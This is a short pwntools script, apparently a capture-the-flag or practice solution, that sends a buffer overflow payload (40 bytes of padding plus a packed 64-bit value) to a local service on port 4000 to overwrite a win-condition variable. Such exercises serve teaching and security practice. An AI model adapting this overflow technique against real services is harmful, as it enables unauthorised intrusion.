from pwn import *

io = remote('localhost', 4000)

offset = 40
condi_win = 0x1122334455667788

payload = b'A' * offset + p64(condi_win)

io.sendline(payload)

io.interactive()